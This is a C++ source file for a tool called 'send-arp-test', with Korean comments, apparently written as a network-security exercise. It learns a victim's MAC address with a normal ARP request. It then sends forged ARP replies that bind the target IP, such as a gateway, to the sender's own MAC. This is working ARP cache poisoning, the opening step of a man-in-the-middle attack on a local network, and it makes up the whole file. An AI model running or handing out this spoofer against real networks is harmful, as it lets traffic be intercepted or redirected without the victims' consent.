#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <cstring>
#include <ifaddrs.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include "ethhdr.h"
#include "arphdr.h"


#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#define MAX_PAIR 10

typedef struct {
    char* sender_ip;
    char* target_ip;
} IpPair;

typedef struct {
    char* dev_;
    IpPair pairs[MAX_PAIR];
    int count;
} Param;

Param param = {
    .dev_ = nullptr,
    .pairs = {},
    .count = 0
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 4 || (argc - 2) % 2 != 0) {
        printf("syntax: send-arp-test <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
        printf("example: send-arp-test eth0 192.168.0.10 192.168.0.1 192.168.0.20 192.168.0.1\n");
        return false;
    }

    param->dev_ = argv[1];
    int pair_count = (argc - 2) / 2;
    if (pair_count > MAX_PAIR) {
        fprintf(stderr, "Too many IP pairs! Maximum allowed is %d.\n", MAX_PAIR);
        return false;
    }

    for (int i = 0; i < pair_count; i++) {
        param->pairs[i].sender_ip = argv[2 + i * 2];
        param->pairs[i].target_ip = argv[3 + i * 2];
    }
    param->count = pair_count;

    return true;
}

Mac getMyMac(const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(1);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(fd);
        exit(1);
    }
    close(fd);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

Ip getMyIp(const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        exit(1);
    }

    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl - get IP");
        close(fd);
        exit(1);
    }

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    close(fd);
    return Ip(inet_ntoa(ipaddr->sin_addr));
}

Mac getMacFromIp(Param param, const char* ip) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    // 준비: 타겟에게 ARP 요청 보내기
    pcap_t* pcap;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) failed: %s\n", param.dev_, errbuf);
        exit(1);
    }

    EthArpPacket packet;
    Mac myMac = getMyMac(param.dev_);
    Ip myIp = getMyIp(param.dev_);

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(myIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(ip));

    if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
        fprintf(stderr, "send ARP request failed: %s\n", pcap_geterr(pcap));
        exit(1);
    }

    // 응답 수신 대기
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        int res = pcap_next_ex(pcap, &header, &pkt);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex failed: %s\n", pcap_geterr(pcap));
            break;
        }

        EthArpPacket* recv = (EthArpPacket*)pkt;
        if (recv->eth_.type() != EthHdr::Arp) continue;
        if (recv->arp_.op() != ArpHdr::Reply) continue;
        if (recv->arp_.sip() != Ip(ip)) continue;

        pcap_close(pcap);
        close(sock);
        return recv->arp_.smac();
    }

    fprintf(stderr, "No ARP reply received for %s\n", ip);
    pcap_close(pcap);
    close(sock);
    exit(1);
}


int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv)) return -1;

    printf("Interface: %s\n", param.dev_);
    for (int i = 0; i < param.count; i++) {
        printf("#%u Sender: %s → Target: %s\n", i+1, param.pairs[i].sender_ip, param.pairs[i].target_ip);
    }

    Mac myMac = getMyMac(param.dev_);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.dev_, 0, 0, 0, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", param.dev_, errbuf);
        return EXIT_FAILURE;
    }
    for (int i=0; i<param.count; i++) {
        EthArpPacket packet;

        char* senderIp = param.pairs[i].sender_ip;
        char* targetIp = param.pairs[i].target_ip;
        Mac senderMac = getMacFromIp(param, senderIp);

        packet.eth_.dmac_ = senderMac;
        packet.eth_.smac_ = myMac;
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::Size;
        packet.arp_.pln_ = Ip::Size;
        packet.arp_.op_ = htons(ArpHdr::Reply);
        packet.arp_.smac_ = myMac;
        packet.arp_.sip_ = htonl(Ip(targetIp));
        packet.arp_.tmac_ = senderMac;
        packet.arp_.tip_ = htonl(Ip(senderIp));

        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        }
    }
    pcap_close(pcap);
}
